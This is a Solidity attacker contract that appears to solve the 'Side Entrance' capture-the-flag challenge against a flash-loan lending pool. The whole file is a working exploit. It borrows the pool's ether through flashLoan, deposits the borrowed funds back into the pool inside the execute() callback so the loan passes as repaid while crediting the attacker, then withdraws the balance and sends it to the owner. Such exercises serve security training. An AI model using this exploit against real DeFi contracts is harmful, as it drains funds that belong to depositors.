// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool} from "src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Execute is IFlashLoanEtherReceiver {
    SideEntranceLenderPool sideEntranceLenderPool = new SideEntranceLenderPool();
    address owner;

    constructor(address _owner, SideEntranceLenderPool _sideEntranceLenderPool) {
        owner = _owner;
        sideEntranceLenderPool = _sideEntranceLenderPool;
    }

    function doFlashLoan(uint256 amount) external payable {
        sideEntranceLenderPool.flashLoan(amount);
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function doWithdraw() external payable {
        sideEntranceLenderPool.withdraw();
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    receive() external payable {}
}
